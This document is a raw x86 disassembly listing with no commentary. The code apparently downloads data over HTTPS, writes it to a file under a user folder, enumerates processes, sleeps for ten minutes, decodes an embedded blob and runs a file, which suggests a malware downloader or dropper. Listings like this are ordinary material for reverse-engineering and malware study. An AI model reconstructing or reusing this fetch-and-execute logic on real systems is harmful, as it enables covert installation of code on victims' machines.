  401ecf:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401ed2:	ff d0                	call   *%eax
  401ed4:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  401eda:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  401ee0:	85 c0                	test   %eax,%eax
  401ee2:	0f 84 05 00 00 00    	je     0x401eed
  401ee8:	e9 05 00 00 00       	jmp    0x401ef2
  401eed:	e9 4c 02 00 00       	jmp    0x40213e
  401ef2:	b8 7b 3e 40 00       	mov    $0x403e7b,%eax
  401ef7:	50                   	push   %eax
  401ef8:	8b 45 08             	mov    0x8(%ebp),%eax
  401efb:	50                   	push   %eax
  401efc:	e8 77 08 00 00       	call   0x402778
  401f01:	83 c4 08             	add    $0x8,%esp
  401f04:	83 f8 00             	cmp    $0x0,%eax
  401f07:	0f 84 47 00 00 00    	je     0x401f54
  401f0d:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401f13:	83 c0 2c             	add    $0x2c,%eax
  401f16:	b9 00 00 00 00       	mov    $0x0,%ecx
  401f1b:	51                   	push   %ecx
  401f1c:	b9 00 00 a0 84       	mov    $0x84a00000,%ecx
  401f21:	51                   	push   %ecx
  401f22:	b9 00 00 00 00       	mov    $0x0,%ecx
  401f27:	51                   	push   %ecx
  401f28:	b9 00 00 00 00       	mov    $0x0,%ecx
  401f2d:	51                   	push   %ecx
  401f2e:	b9 00 00 00 00       	mov    $0x0,%ecx
  401f33:	51                   	push   %ecx
  401f34:	8b 08                	mov    (%eax),%ecx
  401f36:	51                   	push   %ecx
  401f37:	b8 81 3e 40 00       	mov    $0x403e81,%eax
  401f3c:	50                   	push   %eax
  401f3d:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  401f43:	50                   	push   %eax
  401f44:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401f47:	ff d0                	call   *%eax
  401f49:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  401f4f:	e9 91 00 00 00       	jmp    0x401fe5
  401f54:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401f5a:	83 c0 2c             	add    $0x2c,%eax
  401f5d:	8d 8d 98 fd ff ff    	lea    -0x268(%ebp),%ecx
  401f63:	83 c1 18             	add    $0x18,%ecx
  401f66:	0f b7 11             	movzwl (%ecx),%edx
  401f69:	81 fa bb 01 00 00    	cmp    $0x1bb,%edx
  401f6f:	b9 00 00 00 00       	mov    $0x0,%ecx
  401f74:	0f 94 c1             	sete   %cl
  401f77:	89 85 78 f5 ff ff    	mov    %eax,-0xa88(%ebp)
  401f7d:	85 c9                	test   %ecx,%ecx
  401f7f:	0f 84 05 00 00 00    	je     0x401f8a
  401f85:	e9 0a 00 00 00       	jmp    0x401f94
  401f8a:	b8 00 00 00 00       	mov    $0x0,%eax
  401f8f:	e9 05 00 00 00       	jmp    0x401f99
  401f94:	b8 00 00 80 00       	mov    $0x800000,%eax
  401f99:	81 c8 00 00 00 80    	or     $0x80000000,%eax
  401f9f:	81 c8 00 00 00 04    	or     $0x4000000,%eax
  401fa5:	81 c8 00 00 20 00    	or     $0x200000,%eax
  401fab:	b9 00 00 00 00       	mov    $0x0,%ecx
  401fb0:	51                   	push   %ecx
  401fb1:	50                   	push   %eax
  401fb2:	b8 00 00 00 00       	mov    $0x0,%eax
  401fb7:	50                   	push   %eax
  401fb8:	b8 00 00 00 00       	mov    $0x0,%eax
  401fbd:	50                   	push   %eax
  401fbe:	b8 00 00 00 00       	mov    $0x0,%eax
  401fc3:	50                   	push   %eax
  401fc4:	8b 85 78 f5 ff ff    	mov    -0xa88(%ebp),%eax
  401fca:	8b 00                	mov    (%eax),%eax
  401fcc:	50                   	push   %eax
  401fcd:	b8 85 3e 40 00       	mov    $0x403e85,%eax
  401fd2:	50                   	push   %eax
  401fd3:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  401fd9:	50                   	push   %eax
  401fda:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401fdd:	ff d0                	call   *%eax
  401fdf:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  401fe5:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  401feb:	85 c0                	test   %eax,%eax
  401fed:	0f 84 05 00 00 00    	je     0x401ff8
  401ff3:	e9 05 00 00 00       	jmp    0x401ffd
  401ff8:	e9 41 01 00 00       	jmp    0x40213e
  401ffd:	b8 00 00 00 00       	mov    $0x0,%eax
  402002:	50                   	push   %eax
  402003:	b8 00 00 00 00       	mov    $0x0,%eax
  402008:	50                   	push   %eax
  402009:	b8 00 00 00 00       	mov    $0x0,%eax
  40200e:	50                   	push   %eax
  40200f:	b8 00 00 00 00       	mov    $0x0,%eax
  402014:	50                   	push   %eax
  402015:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  40201b:	50                   	push   %eax
  40201c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40201f:	ff d0                	call   *%eax
  402021:	85 c0                	test   %eax,%eax
  402023:	0f 84 05 00 00 00    	je     0x40202e
  402029:	e9 05 00 00 00       	jmp    0x402033
  40202e:	e9 0b 01 00 00       	jmp    0x40213e
  402033:	b8 00 00 00 00       	mov    $0x0,%eax
  402038:	50                   	push   %eax
  402039:	8d 85 80 fd ff ff    	lea    -0x280(%ebp),%eax
  40203f:	50                   	push   %eax
  402040:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  402046:	50                   	push   %eax
  402047:	b8 13 00 00 20       	mov    $0x20000013,%eax
  40204c:	50                   	push   %eax
  40204d:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  402053:	50                   	push   %eax
  402054:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402057:	ff d0                	call   *%eax
  402059:	85 c0                	test   %eax,%eax
  40205b:	0f 84 05 00 00 00    	je     0x402066
  402061:	e9 05 00 00 00       	jmp    0x40206b
  402066:	e9 d3 00 00 00       	jmp    0x40213e
  40206b:	8b 85 84 fd ff ff    	mov    -0x27c(%ebp),%eax
  402071:	81 f8 c8 00 00 00    	cmp    $0xc8,%eax
  402077:	0f 84 05 00 00 00    	je     0x402082
  40207d:	e9 bc 00 00 00       	jmp    0x40213e
  402082:	8d 85 80 fd ff ff    	lea    -0x280(%ebp),%eax
  402088:	50                   	push   %eax
  402089:	b8 00 08 00 00       	mov    $0x800,%eax
  40208e:	50                   	push   %eax
  40208f:	8d 85 7f f5 ff ff    	lea    -0xa81(%ebp),%eax
  402095:	50                   	push   %eax
  402096:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  40209c:	50                   	push   %eax
  40209d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4020a0:	ff d0                	call   *%eax
  4020a2:	85 c0                	test   %eax,%eax
  4020a4:	0f 84 05 00 00 00    	je     0x4020af
  4020aa:	e9 05 00 00 00       	jmp    0x4020b4
  4020af:	e9 82 00 00 00       	jmp    0x402136
  4020b4:	8b 85 80 fd ff ff    	mov    -0x280(%ebp),%eax
  4020ba:	85 c0                	test   %eax,%eax
  4020bc:	0f 84 05 00 00 00    	je     0x4020c7
  4020c2:	e9 05 00 00 00       	jmp    0x4020cc
  4020c7:	e9 6a 00 00 00       	jmp    0x402136
  4020cc:	8b 85 80 fd ff ff    	mov    -0x280(%ebp),%eax
  4020d2:	50                   	push   %eax
  4020d3:	8d 85 7f f5 ff ff    	lea    -0xa81(%ebp),%eax
  4020d9:	50                   	push   %eax
  4020da:	8b 85 d4 fd ff ff    	mov    -0x22c(%ebp),%eax
  4020e0:	50                   	push   %eax
  4020e1:	e8 9a 06 00 00       	call   0x402780
  4020e6:	83 c4 0c             	add    $0xc,%esp
  4020e9:	8b 85 d4 fd ff ff    	mov    -0x22c(%ebp),%eax
  4020ef:	8b 8d 80 fd ff ff    	mov    -0x280(%ebp),%ecx
  4020f5:	01 c8                	add    %ecx,%eax
  4020f7:	89 85 d4 fd ff ff    	mov    %eax,-0x22c(%ebp)
  4020fd:	8b 45 10             	mov    0x10(%ebp),%eax
  402100:	8b 08                	mov    (%eax),%ecx
  402102:	8b 95 80 fd ff ff    	mov    -0x280(%ebp),%edx
  402108:	01 d1                	add    %edx,%ecx
  40210a:	89 08                	mov    %ecx,(%eax)
  40210c:	b8 00 08 00 00       	mov    $0x800,%eax
  402111:	50                   	push   %eax
  402112:	b8 00 00 00 00       	mov    $0x0,%eax
  402117:	50                   	push   %eax
  402118:	8d 85 7f f5 ff ff    	lea    -0xa81(%ebp),%eax
  40211e:	50                   	push   %eax
  40211f:	e8 e4 05 00 00       	call   0x402708
  402124:	83 c4 0c             	add    $0xc,%esp
  402127:	8b 85 80 fd ff ff    	mov    -0x280(%ebp),%eax
  40212d:	83 f8 00             	cmp    $0x0,%eax
  402130:	0f 87 4c ff ff ff    	ja     0x402082
  402136:	b8 01 00 00 00       	mov    $0x1,%eax
  40213b:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40213e:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  402144:	85 c0                	test   %eax,%eax
  402146:	0f 84 0c 00 00 00    	je     0x402158
  40214c:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  402152:	50                   	push   %eax
  402153:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402156:	ff d0                	call   *%eax
  402158:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  40215e:	85 c0                	test   %eax,%eax
  402160:	0f 84 0c 00 00 00    	je     0x402172
  402166:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  40216c:	50                   	push   %eax
  40216d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402170:	ff d0                	call   *%eax
  402172:	8b 85 90 fd ff ff    	mov    -0x270(%ebp),%eax
  402178:	85 c0                	test   %eax,%eax
  40217a:	0f 84 0c 00 00 00    	je     0x40218c
  402180:	8b 85 90 fd ff ff    	mov    -0x270(%ebp),%eax
  402186:	50                   	push   %eax
  402187:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40218a:	ff d0                	call   *%eax
  40218c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40218f:	e9 00 00 00 00       	jmp    0x402194
  402194:	c9                   	leave
  402195:	c3                   	ret
  402196:	55                   	push   %ebp
  402197:	89 e5                	mov    %esp,%ebp
  402199:	81 ec 0c 00 00 00    	sub    $0xc,%esp
  40219f:	90                   	nop
  4021a0:	b8 00 00 00 00       	mov    $0x0,%eax
  4021a5:	50                   	push   %eax
  4021a6:	b8 80 00 00 00       	mov    $0x80,%eax
  4021ab:	50                   	push   %eax
  4021ac:	b8 02 00 00 00       	mov    $0x2,%eax
  4021b1:	50                   	push   %eax
  4021b2:	b8 00 00 00 00       	mov    $0x0,%eax
  4021b7:	50                   	push   %eax
  4021b8:	b8 00 00 00 00       	mov    $0x0,%eax
  4021bd:	50                   	push   %eax
  4021be:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  4021c3:	50                   	push   %eax
  4021c4:	8b 45 10             	mov    0x10(%ebp),%eax
  4021c7:	50                   	push   %eax
  4021c8:	e8 4b 05 00 00       	call   0x402718
  4021cd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021d0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4021d3:	83 f8 00             	cmp    $0x0,%eax
  4021d6:	0f 84 2f 00 00 00    	je     0x40220b
  4021dc:	b8 00 00 00 00       	mov    $0x0,%eax
  4021e1:	50                   	push   %eax
  4021e2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4021e5:	50                   	push   %eax
  4021e6:	8b 45 0c             	mov    0xc(%ebp),%eax
  4021e9:	50                   	push   %eax
  4021ea:	8b 45 08             	mov    0x8(%ebp),%eax
  4021ed:	50                   	push   %eax
  4021ee:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4021f1:	50                   	push   %eax
  4021f2:	e8 31 05 00 00       	call   0x402728
  4021f7:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4021fa:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4021fd:	50                   	push   %eax
  4021fe:	e8 2d 05 00 00       	call   0x402730
  402203:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402206:	e9 0a 00 00 00       	jmp    0x402215
  40220b:	b8 00 00 00 00       	mov    $0x0,%eax
  402210:	e9 00 00 00 00       	jmp    0x402215
  402215:	c9                   	leave
  402216:	c3                   	ret
  402217:	55                   	push   %ebp
  402218:	89 e5                	mov    %esp,%ebp
  40221a:	81 ec 3c 00 00 00    	sub    $0x3c,%esp
  402220:	90                   	nop
  402221:	b8 00 00 00 00       	mov    $0x0,%eax
  402226:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402229:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40222c:	50                   	push   %eax
  40222d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402230:	50                   	push   %eax
  402231:	8b 45 08             	mov    0x8(%ebp),%eax
  402234:	50                   	push   %eax
  402235:	e8 4e 05 00 00       	call   0x402788
  40223a:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40223d:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402240:	85 c0                	test   %eax,%eax
  402242:	0f 84 2f 00 00 00    	je     0x402277
  402248:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40224b:	83 c0 20             	add    $0x20,%eax
  40224e:	8b 08                	mov    (%eax),%ecx
  402250:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  402253:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402256:	83 c0 1c             	add    $0x1c,%eax
  402259:	8b 08                	mov    (%eax),%ecx
  40225b:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  40225e:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  402261:	83 c0 04             	add    $0x4,%eax
  402264:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  402267:	89 08                	mov    %ecx,(%eax)
  402269:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40226c:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40226f:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  402272:	e9 0a 00 00 00       	jmp    0x402281
  402277:	b8 00 00 00 00       	mov    $0x0,%eax
  40227c:	e9 00 00 00 00       	jmp    0x402281
  402281:	c9                   	leave
  402282:	c3                   	ret
  402283:	55                   	push   %ebp
  402284:	89 e5                	mov    %esp,%ebp
  402286:	81 ec 50 01 00 00    	sub    $0x150,%esp
  40228c:	90                   	nop
  40228d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402292:	89 85 bc fe ff ff    	mov    %eax,-0x144(%ebp)
  402298:	b8 00 00 00 00       	mov    $0x0,%eax
  40229d:	89 85 b0 fe ff ff    	mov    %eax,-0x150(%ebp)
  4022a3:	8d 85 c0 fe ff ff    	lea    -0x140(%ebp),%eax
  4022a9:	50                   	push   %eax
  4022aa:	8b 45 08             	mov    0x8(%ebp),%eax
  4022ad:	50                   	push   %eax
  4022ae:	e8 dd 04 00 00       	call   0x402790
  4022b3:	89 85 bc fe ff ff    	mov    %eax,-0x144(%ebp)
  4022b9:	8b 85 bc fe ff ff    	mov    -0x144(%ebp),%eax
  4022bf:	83 f8 ff             	cmp    $0xffffffff,%eax
  4022c2:	0f 85 0a 00 00 00    	jne    0x4022d2
  4022c8:	b8 00 00 00 00       	mov    $0x0,%eax
  4022cd:	e9 44 00 00 00       	jmp    0x402316
  4022d2:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  4022d8:	89 c1                	mov    %eax,%ecx
  4022da:	83 c0 01             	add    $0x1,%eax
  4022dd:	89 85 b0 fe ff ff    	mov    %eax,-0x150(%ebp)
  4022e3:	8d 85 c0 fe ff ff    	lea    -0x140(%ebp),%eax
  4022e9:	50                   	push   %eax
  4022ea:	8b 85 bc fe ff ff    	mov    -0x144(%ebp),%eax
  4022f0:	50                   	push   %eax
  4022f1:	e8 a2 04 00 00       	call   0x402798
  4022f6:	83 f8 00             	cmp    $0x0,%eax
  4022f9:	0f 85 d3 ff ff ff    	jne    0x4022d2
  4022ff:	8b 85 bc fe ff ff    	mov    -0x144(%ebp),%eax
  402305:	50                   	push   %eax
  402306:	e8 95 04 00 00       	call   0x4027a0
  40230b:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  402311:	e9 00 00 00 00       	jmp    0x402316
  402316:	c9                   	leave
  402317:	c3                   	ret
  402318:	55                   	push   %ebp
  402319:	89 e5                	mov    %esp,%ebp
  40231b:	81 ec 14 08 00 00    	sub    $0x814,%esp
  402321:	90                   	nop
  402322:	b8 00 00 00 00       	mov    $0x0,%eax
  402327:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40232a:	b8 00 00 00 00       	mov    $0x0,%eax
  40232f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402332:	b8 00 00 00 00       	mov    $0x0,%eax
  402337:	88 85 f8 fd ff ff    	mov    %al,-0x208(%ebp)
  40233d:	b8 ff 01 00 00       	mov    $0x1ff,%eax
  402342:	50                   	push   %eax
  402343:	b8 00 00 00 00       	mov    $0x0,%eax
  402348:	50                   	push   %eax
  402349:	8d 85 f9 fd ff ff    	lea    -0x207(%ebp),%eax
  40234f:	50                   	push   %eax
  402350:	e8 b3 03 00 00       	call   0x402708
  402355:	83 c4 0c             	add    $0xc,%esp
  402358:	b8 00 00 00 00       	mov    $0x0,%eax
  40235d:	88 85 f8 fb ff ff    	mov    %al,-0x408(%ebp)
  402363:	b8 ff 01 00 00       	mov    $0x1ff,%eax
  402368:	50                   	push   %eax
  402369:	b8 00 00 00 00       	mov    $0x0,%eax
  40236e:	50                   	push   %eax
  40236f:	8d 85 f9 fb ff ff    	lea    -0x407(%ebp),%eax
  402375:	50                   	push   %eax
  402376:	e8 8d 03 00 00       	call   0x402708
  40237b:	83 c4 0c             	add    $0xc,%esp
  40237e:	b8 00 00 00 00       	mov    $0x0,%eax
  402383:	88 85 f8 f9 ff ff    	mov    %al,-0x608(%ebp)
  402389:	b8 ff 01 00 00       	mov    $0x1ff,%eax
  40238e:	50                   	push   %eax
  40238f:	b8 00 00 00 00       	mov    $0x0,%eax
  402394:	50                   	push   %eax
  402395:	8d 85 f9 f9 ff ff    	lea    -0x607(%ebp),%eax
  40239b:	50                   	push   %eax
  40239c:	e8 67 03 00 00       	call   0x402708
  4023a1:	83 c4 0c             	add    $0xc,%esp
  4023a4:	b8 00 00 00 00       	mov    $0x0,%eax
  4023a9:	88 85 f8 f7 ff ff    	mov    %al,-0x808(%ebp)
  4023af:	b8 ff 01 00 00       	mov    $0x1ff,%eax
  4023b4:	50                   	push   %eax
  4023b5:	b8 00 00 00 00       	mov    $0x0,%eax
  4023ba:	50                   	push   %eax
  4023bb:	8d 85 f9 f7 ff ff    	lea    -0x807(%ebp),%eax
  4023c1:	50                   	push   %eax
  4023c2:	e8 41 03 00 00       	call   0x402708
  4023c7:	83 c4 0c             	add    $0xc,%esp
  4023ca:	b8 89 3e 40 00       	mov    $0x403e89,%eax
  4023cf:	50                   	push   %eax
  4023d0:	e8 23 03 00 00       	call   0x4026f8
  4023d5:	b9 94 3e 40 00       	mov    $0x403e94,%ecx
  4023da:	51                   	push   %ecx
  4023db:	50                   	push   %eax
  4023dc:	e8 1f 03 00 00       	call   0x402700
  4023e1:	89 85 f4 f7 ff ff    	mov    %eax,-0x80c(%ebp)
  4023e7:	b8 9e 3e 40 00       	mov    $0x403e9e,%eax
  4023ec:	50                   	push   %eax
  4023ed:	e8 06 03 00 00       	call   0x4026f8
  4023f2:	b9 aa 3e 40 00       	mov    $0x403eaa,%ecx
  4023f7:	51                   	push   %ecx
  4023f8:	50                   	push   %eax
  4023f9:	e8 02 03 00 00       	call   0x402700
  4023fe:	89 85 f0 f7 ff ff    	mov    %eax,-0x810(%ebp)
  402404:	b8 00 00 00 00       	mov    $0x0,%eax
  402409:	50                   	push   %eax
  40240a:	b8 1a 00 00 00       	mov    $0x1a,%eax
  40240f:	50                   	push   %eax
  402410:	8d 85 f8 f7 ff ff    	lea    -0x808(%ebp),%eax
  402416:	50                   	push   %eax
  402417:	b8 00 00 00 00       	mov    $0x0,%eax
  40241c:	50                   	push   %eax
  40241d:	8b 85 f0 f7 ff ff    	mov    -0x810(%ebp),%eax
  402423:	ff d0                	call   *%eax
  402425:	8d 85 f8 f7 ff ff    	lea    -0x808(%ebp),%eax
  40242b:	50                   	push   %eax
  40242c:	b8 c2 3e 40 00       	mov    $0x403ec2,%eax
  402431:	50                   	push   %eax
  402432:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  402438:	50                   	push   %eax
  402439:	8b 85 f4 f7 ff ff    	mov    -0x80c(%ebp),%eax
  40243f:	ff d0                	call   *%eax
  402441:	8d 85 f8 f7 ff ff    	lea    -0x808(%ebp),%eax
  402447:	50                   	push   %eax
  402448:	b8 d3 3e 40 00       	mov    $0x403ed3,%eax
  40244d:	50                   	push   %eax
  40244e:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
  402454:	50                   	push   %eax
  402455:	8b 85 f4 f7 ff ff    	mov    -0x80c(%ebp),%eax
  40245b:	ff d0                	call   *%eax
  40245d:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  402463:	50                   	push   %eax
  402464:	e8 ae fd ff ff       	call   0x402217
  402469:	83 c4 04             	add    $0x4,%esp
  40246c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40246f:	b8 00 00 00 00       	mov    $0x0,%eax
  402474:	50                   	push   %eax
  402475:	e8 f6 02 00 00       	call   0x402770
  40247a:	b9 00 02 00 00       	mov    $0x200,%ecx
  40247f:	51                   	push   %ecx
  402480:	8d 8d f8 f9 ff ff    	lea    -0x608(%ebp),%ecx
  402486:	51                   	push   %ecx
  402487:	50                   	push   %eax
  402488:	e8 1b 03 00 00       	call   0x4027a8
  40248d:	e8 e4 f5 ff ff       	call   0x401a76
  402492:	85 c0                	test   %eax,%eax
  402494:	0f 84 0a 00 00 00    	je     0x4024a4
  40249a:	b8 00 00 00 00       	mov    $0x0,%eax
  40249f:	e9 c2 01 00 00       	jmp    0x402666
  4024a4:	b8 e1 3e 40 00       	mov    $0x403ee1,%eax
  4024a9:	50                   	push   %eax
  4024aa:	e8 d4 fd ff ff       	call   0x402283
  4024af:	83 c4 04             	add    $0x4,%esp
  4024b2:	83 f8 01             	cmp    $0x1,%eax
  4024b5:	0f 85 1c 00 00 00    	jne    0x4024d7
  4024bb:	b8 e9 3e 40 00       	mov    $0x403ee9,%eax
  4024c0:	50                   	push   %eax
  4024c1:	e8 bd fd ff ff       	call   0x402283
  4024c6:	83 c4 04             	add    $0x4,%esp
  4024c9:	83 f8 01             	cmp    $0x1,%eax
  4024cc:	0f 8c 05 00 00 00    	jl     0x4024d7
  4024d2:	e9 0a 00 00 00       	jmp    0x4024e1
  4024d7:	b8 00 00 00 00       	mov    $0x0,%eax
  4024dc:	e9 85 01 00 00       	jmp    0x402666
  4024e1:	e8 ca 02 00 00       	call   0x4027b0
  4024e6:	b9 f1 3e 40 00       	mov    $0x403ef1,%ecx
  4024eb:	51                   	push   %ecx
  4024ec:	50                   	push   %eax
  4024ed:	e8 86 02 00 00       	call   0x402778
  4024f2:	83 c4 08             	add    $0x8,%esp
  4024f5:	83 f8 00             	cmp    $0x0,%eax
  4024f8:	0f 85 08 01 00 00    	jne    0x402606
  4024fe:	e8 2e f6 ff ff       	call   0x401b31
  402503:	89 85 ec f7 ff ff    	mov    %eax,-0x814(%ebp)
  402509:	8b 45 08             	mov    0x8(%ebp),%eax
  40250c:	83 f8 02             	cmp    $0x2,%eax
  40250f:	0f 85 0b 00 00 00    	jne    0x402520
  402515:	b8 c0 27 09 00       	mov    $0x927c0,%eax
  40251a:	50                   	push   %eax
  40251b:	e8 40 02 00 00       	call   0x402760
  402520:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402523:	83 f8 00             	cmp    $0x0,%eax
  402526:	0f 84 14 00 00 00    	je     0x402540
  40252c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40252f:	81 f8 00 18 01 00    	cmp    $0x11800,%eax
  402535:	0f 8f 05 00 00 00    	jg     0x402540
  40253b:	e9 8b 00 00 00       	jmp    0x4025cb
  402540:	8b 85 ec f7 ff ff    	mov    -0x814(%ebp),%eax
  402546:	83 f8 20             	cmp    $0x20,%eax
  402549:	0f 85 2f 00 00 00    	jne    0x40257e
  40254f:	b8 1c 00 00 00       	mov    $0x1c,%eax
  402554:	50                   	push   %eax
  402555:	b8 0b 3d 40 00       	mov    $0x403d0b,%eax
  40255a:	50                   	push   %eax
  40255b:	e8 26 f6 ff ff       	call   0x401b86
  402560:	83 c4 08             	add    $0x8,%esp
  402563:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402566:	50                   	push   %eax
  402567:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40256a:	50                   	push   %eax
  40256b:	b8 0b 3d 40 00       	mov    $0x403d0b,%eax
  402570:	50                   	push   %eax
  402571:	e8 80 f6 ff ff       	call   0x401bf6
  402576:	83 c4 0c             	add    $0xc,%esp
  402579:	e9 2a 00 00 00       	jmp    0x4025a8
  40257e:	b8 1c 00 00 00       	mov    $0x1c,%eax
  402583:	50                   	push   %eax
  402584:	b8 28 3d 40 00       	mov    $0x403d28,%eax
  402589:	50                   	push   %eax
  40258a:	e8 f7 f5 ff ff       	call   0x401b86
  40258f:	83 c4 08             	add    $0x8,%esp
  402592:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402595:	50                   	push   %eax
  402596:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402599:	50                   	push   %eax
  40259a:	b8 28 3d 40 00       	mov    $0x403d28,%eax
  40259f:	50                   	push   %eax
  4025a0:	e8 51 f6 ff ff       	call   0x401bf6
  4025a5:	83 c4 0c             	add    $0xc,%esp
  4025a8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4025ab:	83 f8 00             	cmp    $0x0,%eax
  4025ae:	0f 84 17 00 00 00    	je     0x4025cb
  4025b4:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  4025ba:	50                   	push   %eax
  4025bb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4025be:	50                   	push   %eax
  4025bf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4025c2:	50                   	push   %eax
  4025c3:	e8 ce fb ff ff       	call   0x402196
  4025c8:	83 c4 0c             	add    $0xc,%esp
  4025cb:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  4025d1:	50                   	push   %eax
  4025d2:	b8 4e 3f 40 00       	mov    $0x403f4e,%eax
  4025d7:	50                   	push   %eax
  4025d8:	b8 f6 3e 40 00       	mov    $0x403ef6,%eax
  4025dd:	50                   	push   %eax
  4025de:	e8 dd ee ff ff       	call   0x4014c0
  4025e3:	83 c4 0c             	add    $0xc,%esp
  4025e6:	b8 00 00 00 00       	mov    $0x0,%eax
  4025eb:	50                   	push   %eax
  4025ec:	b8 7a 3f 40 00       	mov    $0x403f7a,%eax
  4025f1:	50                   	push   %eax
  4025f2:	8d 85 f8 f9 ff ff    	lea    -0x608(%ebp),%eax
  4025f8:	50                   	push   %eax
  4025f9:	e8 02 ea ff ff       	call   0x401000
  4025fe:	83 c4 0c             	add    $0xc,%esp
  402601:	e9 56 00 00 00       	jmp    0x40265c
  402606:	b8 01 0c 00 00       	mov    $0xc01,%eax
  40260b:	50                   	push   %eax
  40260c:	b8 df 30 40 00       	mov    $0x4030df,%eax
  402611:	50                   	push   %eax
  402612:	e8 6f f5 ff ff       	call   0x401b86
  402617:	83 c4 08             	add    $0x8,%esp
  40261a:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
  402620:	50                   	push   %eax
  402621:	b8 01 0c 00 00       	mov    $0xc01,%eax
  402626:	50                   	push   %eax
  402627:	b8 df 30 40 00       	mov    $0x4030df,%eax
  40262c:	50                   	push   %eax
  40262d:	e8 64 fb ff ff       	call   0x402196
  402632:	83 c4 0c             	add    $0xc,%esp
  402635:	b8 00 00 00 00       	mov    $0x0,%eax
  40263a:	50                   	push   %eax
  40263b:	b8 00 00 00 00       	mov    $0x0,%eax
  402640:	50                   	push   %eax
  402641:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
  402647:	50                   	push   %eax
  402648:	e8 b3 e9 ff ff       	call   0x401000
  40264d:	83 c4 0c             	add    $0xc,%esp
  402650:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
  402656:	50                   	push   %eax
  402657:	e8 0c 01 00 00       	call   0x402768
  40265c:	b8 00 00 00 00       	mov    $0x0,%eax
  402661:	e9 00 00 00 00       	jmp    0x402666
  402666:	c9                   	leave
  402667:	c3                   	ret
	...
  402680:	55                   	push   %ebp
  402681:	89 e5                	mov    %esp,%ebp
  402683:	81 ec 14 00 00 00    	sub    $0x14,%esp
  402689:	90                   	nop
  40268a:	b8 00 00 00 00       	mov    $0x0,%eax
  40268f:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402692:	b8 00 00 03 00       	mov    $0x30000,%eax
  402697:	50                   	push   %eax
  402698:	b8 00 00 01 00       	mov    $0x10000,%eax
  40269d:	50                   	push   %eax
  40269e:	e8 15 01 00 00       	call   0x4027b8
  4026a3:	83 c4 08             	add    $0x8,%esp
  4026a6:	b8 01 00 00 00       	mov    $0x1,%eax
  4026ab:	50                   	push   %eax
  4026ac:	e8 0f 01 00 00       	call   0x4027c0
  4026b1:	83 c4 04             	add    $0x4,%esp
  4026b4:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4026b7:	50                   	push   %eax
  4026b8:	b8 00 00 00 00       	mov    $0x0,%eax
